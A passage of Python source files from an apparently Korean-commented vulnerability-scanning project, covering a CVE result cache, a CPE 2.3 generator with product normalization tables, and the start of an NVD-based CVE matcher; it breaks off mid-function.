    def __init__(
        self,
        backend="sqlite",
        ttl=86400,  # 24시간
        db_path="data/cve_cache.db"
    ):
        """
        Args:
            backend: "memory", "sqlite", "redis"
            ttl: Time-to-live (초), 기본 24시간
            db_path: SQLite DB 경로
        """
        self.backend = backend
        self.ttl = ttl
        self.memory_cache = {}
        self.conn = None
        self.redis_client = None
        
        if backend == "sqlite":
            self._init_sqlite(db_path)
        elif backend == "redis":
            self._init_redis()
        
        logger.info(f"CacheManager initialized (backend={backend}, ttl={ttl}s)")
    
    def _init_sqlite(self, db_path: str):
        """SQLite 캐시 초기화"""
        # 디렉토리 생성
        Path(db_path).parent.mkdir(parents=True, exist_ok=True)
        
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.execute("""
            CREATE TABLE IF NOT EXISTS cve_cache (
                key TEXT PRIMARY KEY,
                value TEXT NOT NULL,
                expires_at INTEGER NOT NULL,
                created_at INTEGER NOT NULL
            )
        """)
        self.conn.execute("""
            CREATE INDEX IF NOT EXISTS idx_expires_at ON cve_cache(expires_at)
        """)
        self.conn.commit()
        logger.info(f"SQLite cache initialized: {db_path}")
    
    def _init_redis(self):
        """Redis 캐시 초기화"""
        try:
            import redis
            self.redis_client = redis.Redis(
                host='localhost',
                port=6379,
                db=0,
                decode_responses=True
            )
            # 연결 테스트
            self.redis_client.ping()
            logger.info("Redis cache initialized")
        except Exception as e:
            logger.error(f"Redis initialization failed: {e}")
            logger.warning("Falling back to memory-only cache")
            self.backend = "memory"
    
    def get(self, key: str) -> Optional[Dict[str, Any]]:
        """
        캐시 조회 (메모리 → 영구 순서)
        
        Args:
            key: 캐시 키
        
        Returns:
            캐시된 데이터 또는 None
        """
        # 1. 메모리 캐시 확인
        if key in self.memory_cache:
            data, expires_at = self.memory_cache[key]
            if time.time() < expires_at:
                logger.debug(f"Memory cache HIT: {key[:60]}...")
                return data
            else:
                # 만료된 캐시 삭제
                del self.memory_cache[key]
        
        # 2. 영구 캐시 확인
        if self.backend == "sqlite":
            return self._get_sqlite(key)
        elif self.backend == "redis":
            return self._get_redis(key)
        
        return None
    
    def _get_sqlite(self, key: str) -> Optional[Dict[str, Any]]:
        """SQLite에서 조회"""
        try:
            cursor = self.conn.execute(
                "SELECT value, expires_at FROM cve_cache WHERE key = ?",
                (key,)
            )
            row = cursor.fetchone()
            
            if row:
                value_json, expires_at = row
                
                # 만료 확인
                if time.time() < expires_at:
                    data = json.loads(value_json)
                    # 메모리 캐시에도 저장
                    self.memory_cache[key] = (data, expires_at)
                    logger.debug(f"SQLite cache HIT: {key[:60]}...")
                    return data
                else:
                    # 만료된 캐시 삭제
                    self.conn.execute("DELETE FROM cve_cache WHERE key = ?", (key,))
                    self.conn.commit()
                    logger.debug(f"SQLite cache EXPIRED: {key[:60]}...")
            
            return None
        
        except Exception as e:
            logger.error(f"SQLite get error: {e}")
            return None
    
    def _get_redis(self, key: str) -> Optional[Dict[str, Any]]:
        """Redis에서 조회"""
        try:
            value_json = self.redis_client.get(f"cve:{key}")
            if value_json:
                data = json.loads(value_json)
                # 메모리 캐시에도 저장
                expires_at = int(time.time() + self.ttl)
                self.memory_cache[key] = (data, expires_at)
                logger.debug(f"Redis cache HIT: {key[:60]}...")
                return data
            return None
        
        except Exception as e:
            logger.error(f"Redis get error: {e}")
            return None
    
    def set(self, key: str, value: Dict[str, Any]):
        """
        캐시 저장 (메모리 + 영구)
        
        Args:
            key: 캐시 키
            value: 저장할 데이터
        """
        expires_at = int(time.time() + self.ttl)
        created_at = int(time.time())
        
        # 1. 메모리 캐시
        self.memory_cache[key] = (value, expires_at)
        
        # 2. 영구 캐시
        if self.backend == "sqlite":
            self._set_sqlite(key, value, expires_at, created_at)
        elif self.backend == "redis":
            self._set_redis(key, value)
        
        logger.debug(f"Cache SET: {key[:60]}...")
    
    def _set_sqlite(self, key: str, value: Dict[str, Any], expires_at: int, created_at: int):
        """SQLite에 저장"""
        try:
            value_json = json.dumps(value, ensure_ascii=False)
            self.conn.execute(
                "INSERT OR REPLACE INTO cve_cache (key, value, expires_at, created_at) VALUES (?, ?, ?, ?)",
                (key, value_json, expires_at, created_at)
            )
            self.conn.commit()
        except Exception as e:
            logger.error(f"SQLite set error: {e}")
    
    def _set_redis(self, key: str, value: Dict[str, Any]):
        """Redis에 저장"""
        try:
            value_json = json.dumps(value, ensure_ascii=False)
            self.redis_client.setex(
                f"cve:{key}",
                self.ttl,
                value_json
            )
        except Exception as e:
            logger.error(f"Redis set error: {e}")
    
    def clear_expired(self) -> int:
        """
        만료된 캐시 정리
        
        Returns:
            삭제된 캐시 수
        """
        current_time = int(time.time())
        deleted_count = 0
        
        # 메모리 캐시 정리
        expired_keys = [
            key for key, (_, expires_at) in self.memory_cache.items()
            if expires_at < current_time
        ]
        for key in expired_keys:
            del self.memory_cache[key]
            deleted_count += 1
        
        # 영구 캐시 정리
        if self.backend == "sqlite":
            try:
                cursor = self.conn.execute(
                    "DELETE FROM cve_cache WHERE expires_at < ?",
                    (current_time,)
                )
                self.conn.commit()
                deleted_count += cursor.rowcount
            except Exception as e:
                logger.error(f"SQLite clear_expired error: {e}")
        
        if deleted_count > 0:
            logger.info(f"Cleared {deleted_count} expired cache entries")
        
        return deleted_count
    
    def clear_all(self):
        """전체 캐시 삭제"""
        self.memory_cache.clear()
        
        if self.backend == "sqlite":
            try:
                self.conn.execute("DELETE FROM cve_cache")
                self.conn.commit()
                logger.info("All SQLite cache cleared")
            except Exception as e:
                logger.error(f"SQLite clear_all error: {e}")
        
        elif self.backend == "redis":
            try:
                for key in self.redis_client.scan_iter("cve:*"):
                    self.redis_client.delete(key)
                logger.info("All Redis cache cleared")
            except Exception as e:
                logger.error(f"Redis clear_all error: {e}")
    
    def get_stats(self) -> Dict[str, Any]:
        """캐시 통계"""
        stats = {
            "backend": self.backend,
            "ttl": f"{self.ttl}s",
            "memory_cache_size": len(self.memory_cache)
        }
        
        if self.backend == "sqlite":
            try:
                cursor = self.conn.execute("SELECT COUNT(*) FROM cve_cache")
                count = cursor.fetchone()[0]
                stats["sqlite_cache_size"] = count
            except Exception as e:
                logger.error(f"SQLite stats error: {e}")
        
        elif self.backend == "redis":
            try:
                count = len(list(self.redis_client.scan_iter("cve:*")))
                stats["redis_cache_size"] = count
            except Exception as e:
                logger.error(f"Redis stats error: {e}")
        
        return stats
    
    def __del__(self):
        """소멸자: 연결 종료"""
        if self.conn:
            self.conn.close()
```
---

## File 11: cpe_generator.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\core\cve\cpe_generator.py`

```python
"""
CPE(Common Platform Enumeration) 생성기
- NVD의 CPE 표준에 맞춰 기술 스택 정보를 CPE로 변환
"""

import re
import logging
from typing import Optional, Dict, List, Any

logger = logging.getLogger(__name__)


# ================================================================================
# PRODUCT NORMALIZATION MAP
# ================================================================================

PRODUCT_NORMALIZATION_MAP = {
    # Web Servers
    "apache": "apache:http_server",        # ✅ 변경!
    "apache httpd": "apache:http_server",  # ✅ 변경!
    "httpd": "apache:http_server",         # ✅ 변경!
    "nginx": "nginx:nginx",
    "iis": "microsoft:internet_information_services",
    "microsoft-iis": "microsoft:internet_information_services",
    
    # Languages & Runtimes
    "node": "nodejs:node.js",
    "node.js": "nodejs:node.js",
    "nodejs": "nodejs:node.js",
    "php": "php:php",
    "python": "python:python",
    "java": "oracle:jdk",
    
    # Web Frameworks
    "express": "expressjs:express",
    "expressjs": "expressjs:express",
    "django": "djangoproject:django",
    "flask": "palletsprojects:flask",
    "spring": "vmware:spring_framework",
    "spring boot": "vmware:spring_boot",
    "laravel": "laravel:laravel",
    "rails": "rubyonrails:rails",
    "ruby on rails": "rubyonrails:rails",
    
    # Databases
    "mysql": "oracle:mysql",
    "mariadb": "mariadb:mariadb",
    "postgresql": "postgresql:postgresql",
    "postgres": "postgresql:postgresql",
    "sqlite": "sqlite:sqlite",
    "mongodb": "mongodb:mongodb",
    "redis": "redis:redis",
    "elasticsearch": "elastic:elasticsearch",
    "mssql": "microsoft:sql_server",
    "sql server": "microsoft:sql_server",
    
    # JavaScript Libraries
    "jquery": "jquery:jquery",
    "angular": "angular:angular",
    "angularjs": "angular:angular",
    "react": "facebook:react",
    "vue": "vuejs:vue.js",
    "vue.js": "vuejs:vue.js",
    "bootstrap": "getbootstrap:bootstrap",
    
    # CMS
    "wordpress": "wordpress:wordpress",
    "joomla": "joomla:joomla",
    "drupal": "drupal:drupal",
    
    # Others
    "owasp juice shop": "owasp:juice_shop",
    "juice shop": "owasp:juice_shop",
    "docker": "docker:docker",
    "kubernetes": "kubernetes:kubernetes",
    "openssl": "openssl:openssl",
    "openssh": "openbsd:openssh",
}


# ================================================================================
# CPE BLACKLIST
# ================================================================================

CPE_BLACKLIST = [
    # HTML/CSS/Markup
    "html", "html5", "css", "css3", "javascript", "js", "xml", "json", "yaml", "markdown", "svg",
    
    # Network/Protocol
    "ip", "tcp", "udp", "http", "https", "ssl", "tls", "dns", "dhcp", "nat", "vpn", "firewall",
    
    # Generic Terms
    "server", "client", "api", "web", "application", "service", "protocol", "port", "host", "network",
    "unknown", "na", "none", "null", "empty",
    
    # UI/Meta
    "title", "description", "version", "name", "type", "category", "tag", "label", "country", "language",
    "font", "icon", "image", "video", "audio", "button", "menu", "form", "table", "chart"
]


def is_blacklisted(product: str) -> bool:
    """블랙리스트 제품인지 확인"""
    if not product:
        return True
    
    product_lower = product.lower().strip()
    
    # 너무 짧은 제품명은 스킵
    if not product_lower or len(product_lower) < 2:
        return True
    
    # 완전 일치
    for blacklisted in CPE_BLACKLIST:
        if product_lower == blacklisted:
            logger.debug(f"[CPE] Blacklisted (exact match): {product}")
            return True
    
    # 단어 포함
    if f" {product_lower} " in f" {' '.join(CPE_BLACKLIST)} ":
        logger.debug(f"[CPE] Blacklisted (word found): {product}")
        return True
    
    return False


def normalize_product_name(product: str) -> str:
    """제품명을 CPE 표준으로 정규화"""
    if not product:
        return ""
    
    product_lower = product.lower().strip()
    
    # 완전 일치
    if product_lower in PRODUCT_NORMALIZATION_MAP:
        return PRODUCT_NORMALIZATION_MAP[product_lower]
    
    # 부분 매칭
    for key, value in PRODUCT_NORMALIZATION_MAP.items():
        if key in product_lower or product_lower.startswith(key):
            return value
    
    # 공백/특수문자 제거 (Apache2.4.41 -> apache)
    normalized = re.sub(r'[^a-z0-9_]', '', product_lower)
    normalized = normalized.replace('_', '')
    
    return normalized


def generate_cpe(vendor: str, product: str, version: str) -> str:
    """CPE 2.3 문자열 생성"""
    # 버전 정규화
    if not version or version.lower() in ["na", "unknown", ""]:
        version = "*"
    
    cpe = f"cpe:2.3:a:{vendor}:{product}:{version}:*:*:*:*:*:*:*"
    return cpe


def parse_vendor_product(normalized_product: str) -> tuple:
    """정규화된 제품명에서 vendor와 product 분리"""
    if ":" in normalized_product:
        parts = normalized_product.split(":", 1)
        return parts[0], parts[1]
    else:
        return normalized_product, normalized_product


def infer_vendor(product: str) -> str:
    """제품명에서 벤더 추론"""
    VENDOR_MAP = {
        "jquery": "jquery",
        "express": "expressjs",
        "nginx": "nginx",
        "apache": "apache",
        "http_server": "apache",  # ✅ 추가
        "mysql": "mysql",
        "postgresql": "postgresql",
        "redis": "redis",
        "mongodb": "mongodb",
        "php": "php",
        "python": "python",
        "node.js": "nodejs",
        "nodejs": "nodejs",
        "wordpress": "wordpress",
        "drupal": "drupal",
        "joomla": "joomla",
        "owasp juice shop": "owasp",
        "juice shop": "owasp",
        "application": "application",
    }
    
    product_normalized = product.replace("_", " ").strip()
    
    if product_normalized in VENDOR_MAP:
        return VENDOR_MAP[product_normalized]
    
    # 공백이 있으면 첫 단어를 벤더로 사용
    return product.split()[0] if product else "unknown"


def extract_version_from_product(product_string: str) -> tuple:
    """
    복잡한 제품 문자열에서 제품명과 버전 추출
    
    Examples:
        "Apache/2.4.7 (Ubuntu)" → ("apache", "2.4.7")
        "PHP/5.5.9-1ubuntu4.14" → ("php", "5.5.9")
        "mysql 5.7.35" → ("mysql", "5.7.35")
    
    Returns:
        (product, version)
    """
    if not product_string:
        return ("", "")
    
    # 1. "제품/버전 (OS)" 패턴
    match = re.match(r'^(\w+)/(\d+(?:\.\d+)*)', product_string, re.IGNORECASE)
    if match:
        return (match.group(1).lower(), match.group(2))
    
    # 2. "제품 버전" 패턴
    match = re.match(r'^([\w\s]+)\s+(\d+(?:\.\d+)*)', product_string)
    if match:
        return (match.group(1).strip().lower(), match.group(2))
    
    # 3. 버전이 없는 경우
    return (product_string.lower().strip(), "")


def extract_cpe_from_tech(tech: Dict[str, Any]) -> Optional[str]:
    """
    기술 정보에서 CPE 추출/생성 (개선 버전)
    """
    original_product = tech.get("original_name", "") or tech.get("product", "")
    product = tech.get("product", "").lower().strip()
    version = tech.get("version", "").strip()
    vendor = tech.get("vendor", "").lower().strip()
    
    # 🆕 버전이 복잡한 문자열인 경우 파싱
    if not version or version in ["N/A", "", "unknown"]:
        # original_name에서 버전 추출 시도
        _, extracted_version = extract_version_from_product(original_product)
        if extracted_version:
            version = extracted_version
    
    # 🆕 제품명 정규화 시도
    if not product or product == "n/a":
        extracted_product, extracted_version = extract_version_from_product(original_product)
        if extracted_product:
            product = extracted_product
        if extracted_version and not version:
            version = extracted_version
    
    if not product:
        return None
    
    # 🆕 제품명 정규화 (apache/2.4.7 → apache, Apache/2.4.7 (Ubuntu) → apache)
    product = re.sub(r'[/\s\-\(\)]+.*$', '', product).lower()
    
    # 🆕 버전 정규화 (5.5.9-1ubuntu4.14 → 5.5.9)
    if version and version not in ["N/A", "unknown"]:
        version_match = re.match(r'^(\d+(?:\.\d+){0,2})', version)
        if version_match:
            version = version_match.group(1)
        else:
            version = "*"
    else:
        version = "*"
    
    # 🔥 핵심 수정: PRODUCT_NORMALIZATION_MAP 적용
    if product in PRODUCT_NORMALIZATION_MAP:
        normalized = PRODUCT_NORMALIZATION_MAP[product]
        if ":" in normalized:
            vendor, product = normalized.split(":", 1)
        else:
            product = normalized
    
    # 벤더 추론
    if not vendor:
        vendor = infer_vendor(product)
    
    # 제품명 정규화 (공백 → 언더스코어)
    product_normalized = product.replace(" ", "_")
    
    # "vendor:product" 형태면 중복 제거 (http_server:http_server → http_server)
    if vendor and product_normalized.startswith(f"{vendor}_"):
        product_normalized = product_normalized[len(vendor) + 1:]
    
    cpe = f"cpe:2.3:a:{vendor}:{product_normalized}:{version}:*:*:*:*:*:*:*"
    return cpe


def batch_generate_cpes(technologies: List[Dict]) -> List[Dict]:
    """
    기술 스택 목록에 대해 CPE를 일괄 생성
    CPE 2.3 표준 준수
    """
    # ✅ 수정: 주요 서버 스택 포함
    VALID_CATEGORIES = [
        "frontend",    # jQuery, Angular, React, Vue
        "backend",     # Express, Django, Flask
        "framework",
        "library",
        "cms",
        "platform",
        "language",
        "runtime",
        "webserver",   # Apache, Nginx, IIS
        "appserver",
        "database",    # MySQL, PostgreSQL
        "application",
        "detected",    # ← 추가! recog에서 탐지된 것들
        "os"          # ← 추가! Linux, Ubuntu 등
    ]
    
    # ✅ 수정: 블랙리스트 축소
    PRODUCT_BLACKLIST = [
        'unknown', 'http', 'https', 'ssl', 'tls',
        'html5', 'html', 'css', 'javascript',
        'title', 'country', 'ip', 'script',
        'uncommonheaders', 'x-frame-options', 'x-content-type-options',
        'redirectlocation', 'httpserver', 'cookies', 'passwordfield'
    ]
    
    # ✅ 수정: KNOWN_PRODUCTS 대폭 확장
    KNOWN_PRODUCTS = [
        # 웹 서버
        'apache', 'httpd', 'apache httpd', 'apache/2', 'apache httpserver',
        'nginx', 'iis', 'lighttpd', 'caddy',
        
        # 프로그래밍 언어
        'php', 'python', 'ruby', 'perl', 'java', 'node', 'nodejs', 'node.js',
        
        # 데이터베이스
        'mysql', 'mariadb', 'postgresql', 'postgres', 'mongodb', 'redis',
        'sqlite', 'cassandra', 'elasticsearch', 'mssql', 'sql server',
        
        # 웹 프레임워크
        'express', 'django', 'flask', 'spring', 'laravel', 'rails',
        
        # JavaScript 라이브러리
        'jquery', 'angular', 'angularjs', 'react', 'vue', 'vue.js', 'bootstrap',
        
        # CMS
        'wordpress', 'joomla', 'drupal',
        
        # 운영체제
        'linux', 'ubuntu', 'debian', 'centos', 'redhat', 'windows',
        
        # 테스트 앱
        'owasp juice shop', 'juice shop', 'application', 'bwapp', 'dvwa'
    ]
    
    result = []
    filtered_count = 0
    
    for tech in technologies:
        product = tech.get("product", "").lower().strip()
        category = tech.get("category", "other")
        
        # 1️⃣ 블랙리스트 체크
        if not product or product in PRODUCT_BLACKLIST:
            logger.debug(f"[CPE] Blacklisted product: {product}")
            filtered_count += 1
            continue
        
        # 2️⃣ 카테고리 체크
        should_generate_cpe = False
        
        if category in VALID_CATEGORIES:
            # ✅ 정상 카테고리
            should_generate_cpe = True
            logger.debug(f"[CPE] Valid category '{category}' for product: {product}")
        
        elif category == "other":
            # ✅ 핵심 수정: "other" 카테고리도 적극 허용
            if product in KNOWN_PRODUCTS:
                should_generate_cpe = True
                logger.info(f"[CPE] Known product in 'other' category: {product}")
            else:
                # 부분 매칭 시도 (예: "apache/2.4.7" → "apache")
                for known in KNOWN_PRODUCTS:
                    if known in product or product.startswith(known):
                        should_generate_cpe = True
                        logger.info(f"[CPE] Partial match in 'other' category: {product} → {known}")
                        break
            
            if not should_generate_cpe:
                logger.info(f"[CPE] Skipping 'other' category product: {product}")
                filtered_count += 1
                continue
        else:
            logger.info(f"[CPE] Skipping unknown category '{category}': {product}")
            filtered_count += 1
            continue
        
        # 3️⃣ CPE 생성
        if should_generate_cpe:
            cpe = extract_cpe_from_tech(tech)
            
            if cpe:
                tech["cpe"] = cpe
                result.append(tech)
                logger.info(f"[CPE] Generated: {product} (category: {category}) -> {cpe}")
            else:
                logger.debug(f"[CPE] Failed to generate CPE: {product}")
    
    logger.info(f"[CPE] Generated {len(result)} CPEs from {len(technologies)} technologies ({filtered_count} filtered)")
    return result
```
---

## File 12: matcher.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\core\cve\matcher.py`

```python
# app/core/cve/matcher.py

# CVE 매칭 엔진 (완전 개선 버전)

import time
import logging
import re
import sys
from pathlib import Path
from typing import List, Dict, Any, Optional, Tuple
import aiohttp

from .cpe_generator import (
    batch_generate_cpes,
    is_blacklisted,
    normalize_product_name,
    extract_cpe_from_tech
)

# Config import (상대 경로 사용)
# 프로젝트 루트를 sys.path에 추가
project_root = Path(__file__).parent.parent.parent.parent
if str(project_root) not in sys.path:
    sys.path.insert(0, str(project_root))

# Config import 시도 (여러 방법)
try:
    from app.config import Config  # type: ignore
except ImportError:
    try:
        # 직접 import 시도
        import config  # type: ignore
        Config = config.Config
    except ImportError:
        # 최후의 수단: 기본값 사용
        class Config:  # type: ignore
            NVD_API_KEY = None
            NVD_BASE_URL = "https://services.nvd.nist.gov/rest/json/cves/2.0"
            NVD_RESULTS_PER_PAGE = 50
            REQUEST_TIMEOUT = 15

logger = logging.getLogger(__name__)

# 버전 비교 라이브러리
try:
    from packaging import version
    VERSION_COMPARE_AVAILABLE = True
except ImportError:
    VERSION_COMPARE_AVAILABLE = False
    logger.warning("packaging 모듈이 없어 버전 필터링이 비활성화됩니다. pip install packaging 권장")

# Product → (vendor, product) 매핑 테이블 (확장)
PRODUCT_TO_VENDOR_PRODUCT = {
    # 웹 서버
    "apache httpd": ("apache", "http_server"),
    "apache": ("apache", "http_server"),
    "httpd": ("apache", "http_server"),
    "nginx": ("nginx", "nginx"),
    "iis": ("microsoft", "internet_information_services"),
    "lighttpd": ("lighttpd", "lighttpd"),
    "caddy": ("caddyserver", "caddy"),

    # 데이터베이스
    "mysql": ("mysql", "mysql"),
    "mariadb": ("mariadb", "mariadb"),
    "postgresql": ("postgresql", "postgresql"),
    "postgres": ("postgresql", "postgresql"),
    "mongodb": ("mongodb", "mongodb"),
    "redis": ("redis", "redis"),
    "sqlite": ("sqlite", "sqlite"),
    "cassandra": ("apache", "cassandra"),
    "elasticsearch": ("elastic", "elasticsearch"),
    "memcached": ("memcached", "memcached"),

    # SSH/FTP
    "openssh": ("openssh", "openssh"),
    "dropbear": ("dropbear", "dropbear_ssh_server"),
    "vsftpd": ("vsftpd", "vsftpd"),
    "proftpd": ("proftpd", "proftpd"),

    # 메일 서버
    "postfix": ("postfix", "postfix"),
    "sendmail": ("sendmail", "sendmail"),
    "exim": ("exim", "exim"),
    "dovecot": ("dovecot", "dovecot"),

    # Python 웹 프레임워크/서버
    "werkzeug": ("palletsprojects", "werkzeug"),
    "gunicorn": ("benoitc", "gunicorn"),
    "flask": ("palletsprojects", "flask"),
    "django": ("djangoproject", "django"),
    "tornado": ("tornado", "tornado"),
    "bottle": ("bottlepy", "bottle"),
    "fastapi": ("tiangolo", "fastapi"),
    "uvicorn": ("encode", "uvicorn"),

    # JavaScript 런타임/프레임워크
    "node.js": ("nodejs", "node.js"),
    "node": ("nodejs", "node.js"),
    "express": ("expressjs", "express"),
    "react": ("facebook", "react"),
    "vue": ("vuejs", "vue"),
    "angular": ("angular", "angular"),

    # 애플리케이션 서버
    "tomcat": ("apache", "tomcat"),
    "jetty": ("eclipse", "jetty"),
    "wildfly": ("redhat", "wildfly"),
    "jboss": ("redhat", "jboss_application_server"),

    # 프로그래밍 언어
    "python": ("python", "python"),
    "php": ("php", "php"),
    "ruby": ("ruby-lang", "ruby"),
    "perl": ("perl", "perl"),
    "java": ("oracle", "jdk"),

    # 기타
    "docker": ("docker", "docker"),
    "kubernetes": ("kubernetes", "kubernetes"),
    "git": ("git-scm", "git"),
}

def normalize_product_name(product: str) -> str:
    """
    Nmap product 이름을 정규화

    Args:
        product: 원본 제품명

    Returns:
        정규화된 제품명 (소문자, 공백 제거)
    """
    if not product:
        return ""

    # 소문자 변환, 앞뒤 공백 제거
    normalized = product.lower().strip()

    # 슬래시로 구분된 경우 첫 번째 부분만 사용
    # 예: "Werkzeug/3.1.4" -> "werkzeug"
    if "/" in normalized:
        normalized = normalized.split("/")[0].strip()

    # 특수문자 제거 (하이픈, 언더스코어는 유지)
    normalized = re.sub(r'[^\w\s\-_.]', '', normalized)

    return normalized

def parse_and_normalize_version(version_str: str) -> Optional[str]:
    """
    버전 문자열에서 실제 버전 번호만 추출 및 정규화

    Examples:
        "Werkzeug/3.1.4 Python/3.11.14" -> "3.1.4"
        "2.4.41-dev" -> "2.4.41"
        "3.1.4+build123" -> "3.1.4"
        "Apache httpd 2.4.41" -> "2.4.41"

    Args:
        version_str: 원본 버전 문자열

    Returns:
        정규화된 버전 번호 또는 None
    """
    if not version_str:
        return None

    # 슬래시로 구분된 경우 버전 추출
    # 예: "Werkzeug/3.1.4 Python/3.11.14" -> "3.1.4"
    if "/" in version_str:
        parts = version_str.split()
        for part in parts:
            if "/" in part:
                version_part = part.split("/")[-1]
                # 버전 번호 패턴 추출
                version_match = re.search(r'(\d+(?:\.\d+)*)', version_part)
                if version_match:
                    return version_match.group(1)

    # 일반적인 버전 번호 패턴 추출
    # 숫자.숫자.숫자 형식 (예: "2.4.41", "3.1.4")
    version_match = re.search(r'(\d+(?:\.\d+)*)', version_str)
    if version_match:
        version = version_match.group(1)
        # 빌드 번호, dev, alpha 등 제거
        # 예: "2.4.41-dev" -> "2.4.41", "3.1.4+build123" -> "3.1.4"
        version = re.sub(r'[-+].*$', '', version)
        return version

    return None

def extract_product_from_version_string(version_str: str) -> Optional[str]:
    """
    복잡한 version 문자열에서 제품명 추출

    Examples:
        "Werkzeug/3.1.4 Python/3.11.14" -> "Werkzeug"
        "Apache httpd 2.4.41" -> "Apache httpd"

    Args:
        version_str: 버전 문자열

    Returns:
        제품명 또는 None
    """
    if not version_str:
        return None

    # 슬래시로 구분된 경우 첫 번째 제품명 추출
    if "/" in version_str:
        first_part = version_str.split()[0] if version_str.split() else ""
        if "/" in first_part:
            product = first_part.split("/")[0].strip()
            if product:
                return product

    # 일반적인 패턴: "제품명 버전" 형식
    # 예: "Apache httpd 2.4.41" -> "Apache httpd"
    version_match = re.search(r'^(.+?)\s+(\d+(?:\.\d+)*)', version_str)
    if version_match:
        product = version_match.group(1).strip()
        if product:
            return product

    return None

def parse_complex_version_string(version_str: str) -> Dict[str, str]:
    """
    복잡한 버전 문자열 파싱 (여러 형식 지원) - 🆕 신규 함수

    Examples:
        "Apache/2.4.66" → {"product": "Apache", "version": "2.4.66"}
        "mysql 5.7.35" → {"product": "mysql", "version": "5.7.35"}
        "nginx 1.19.0" → {"product": "nginx", "version": "1.19.0"}
        "Werkzeug/3.1.4 Python/3.11.14" → {"product": "Werkzeug", "version": "3.1.4"}
        "Apache httpd 2.4.41 (Ubuntu)" → {"product": "Apache httpd", "version": "2.4.41"}
        "OpenSSH_7.4" → {"product": "OpenSSH", "version": "7.4"} # 🆕 추가

    Args:
        version_str: 버전 문자열

    Returns:
        {"product": "제품명", "version": "버전"}
    """
    if not version_str:
        return {"product": "", "version": ""}

    # 1. 슬래시로 구분 (Apache/2.4.66, Werkzeug/3.1.4)
    if "/" in version_str:
        # 첫 번째 슬래시 항목만 처리
        first_part = version_str.split()[0] if version_str.split() else version_str
        if "/" in first_part:
            parts = first_part.split("/")
            product = parts[0].strip()
            version = parse_and_normalize_version(parts[1]) if len(parts) > 1 else ""
            return {"product": product, "version": version or ""}

    # 🆕 2. 언더스코어로 구분 (OpenSSH_7.4, Python_3.11.14)
    if "_" in version_str:
        # 언더스코어 뒤에 버전 번호가 있는지 확인
        parts = version_str.split("_")
        if len(parts) >= 2:
            # 마지막 부분이 버전 번호인지 확인
            potential_version = parts[-1]
            if re.match(r'^\d+(\.\d+)*', potential_version):
                product = "_".join(parts[:-1])
                version = parse_and_normalize_version(potential_version)
                return {"product": product, "version": version or ""}

    # 3. 공백으로 구분 (mysql 5.7.35, Apache httpd 2.4.41)
    if " " in version_str:
        parts = version_str.split()
        # 마지막 부분이 버전 번호인지 확인
        for i in range(len(parts) - 1, -1, -1):
            if re.match(r'[\d.]+', parts[i]):
                # 버전 발견
                product = " ".join(parts[:i])
                version = parse_and_normalize_version(parts[i])
                return {"product": product, "version": version or ""}

        # 버전 번호가 없으면 전체를 제품명으로
        product = extract_product_from_version_string(version_str)
        if product:
            version = parse_and_normalize_version(version_str)
            return {"product": product, "version": version or ""}

    # 4. 버전만 있는 경우 (1.19.0)
    if re.match(r'^[\d.]+$', version_str):
        return {"product": "", "version": version_str}

    # 5. 제품명만 있는 경우 (nginx)
    return {"product": version_str, "version": ""}

def map_product_to_vendor_product(product: str) -> Optional[Tuple[str, str]]:
    """
    Product 이름을 (vendor, product) 튜플로 변환

    Args:
        product: 제품명

    Returns:
        (vendor, product) 튜플 또는 None
    """
    normalized = normalize_product_name(product)
    if not normalized:
        return None

    # 1. 정확한 매칭 시도
    if normalized in PRODUCT_TO_VENDOR_PRODUCT:
        return PRODUCT_TO_VENDOR_PRODUCT[normalized]

    # 2. 부분 매칭 시도 (키워드 포함)
    for key, value in PRODUCT_TO_VENDOR_PRODUCT.items():
        if key in normalized or normalized in key:
            logger.debug(f"Product mapping (partial match): {product} -> {value}")
            return value

    # 3. 단어 단위 매칭 시도
    normalized_words = set(normalized.split())
    for key, value in PRODUCT_TO_VENDOR_PRODUCT.items():
        key_words = set(key.split())
        if normalized_words & key_words:  # 교집합이 있으면
            logger.debug(f"Product mapping (word match): {product} -> {value}")
            return value

    logger.debug(f"Product mapping failed: {product}")
    return None

def build_cpe_string(vendor: str, product: str, version: str = "*") -> str:
    """
    CPE 2.3 형식 문자열 생성

    Format: cpe:2.3:a:vendor:product:version:*:*:*:*:*:*:*

    Args:
        vendor: 벤더명
        product: 제품명
        version: 버전 (기본값 "*")

    Returns:
        CPE 2.3 문자열
    """
    vendor_clean = vendor.replace(" ", "_").lower()
    product_clean = product.replace(" ", "_").lower()
    version_clean = version if version else "*"

    return f"cpe:2.3:a:{vendor_clean}:{product_clean}:{version_clean}:*:*:*:*:*:*:*"

def parse_cpe_uri(cpe_uri: str) -> Optional[Tuple[str, str]]:
    """
    CPE URI 문자열에서 vendor와 product를 추출

    Format: cpe:2.3:a:vendor:product:version:...

    Args:
        cpe_uri: CPE URI 문자열

    Returns:
        (vendor, product) 튜플 또는 None
    """
    if not cpe_uri or not cpe_uri.startswith("cpe:2.3:"):
        return None

    try:
        parts = cpe_uri.split(":")
        if len(parts) >= 5:
            # cpe:2.3:a:vendor:product:...
            vendor = parts[3].lower().replace("_", " ")
            product = parts[4].lower().replace("_", " ")
            return (vendor, product)
    except Exception as e:
        logger.debug(f"CPE URI 파싱 실패: {cpe_uri}, err={e}")

    return None

def extract_cve_summary(
    vuln_item: Dict[str, Any],
    target_version: str = None,
    target_vendor: str = None,
    target_product: str = None,
    original_product: str = None
) -> Dict[str, Any]:
    """
    NVD v2 응답에서 CVE 요약 정보 추출

    Args:
        vuln_item: NVD API 응답 항목 또는 로컬 cve-search 응답
        target_version: 타겟 버전
        target_vendor: 타겟 벤더
        target_product: 타겟 제품명
        original_product: 원본 제품명 (매핑 전)

    Returns:
        CVE 요약 정보 딕셔너리
    """
    # 🆕 로컬 cve-search 형식 감지 및 변환
    if "id" in vuln_item and "cve" not in vuln_item:
        logger.debug(f"[MATCHER] Detected local cve-search format, converting to NVD format")
        
        # 🔥 CVSS 점수 추출 (CVE-Search API 대응 개선)
        cvss_score = None
        cvss_vector = ""
        
        # 1단계: CVSS v3 우선 추출
        if "cvss3" in vuln_item and vuln_item["cvss3"]:
            cvss_score = vuln_item["cvss3"]
            logger.debug(f"[MATCHER-CVSS] Using cvss3: {cvss_score}")
            if "cvss3Vector" in vuln_item:
                cvss_vector = vuln_item["cvss3Vector"]
        
        # 2단계: CVSS v2 폴백 (cvss 필드)
        if not cvss_score and "cvss" in vuln_item and vuln_item["cvss"]:
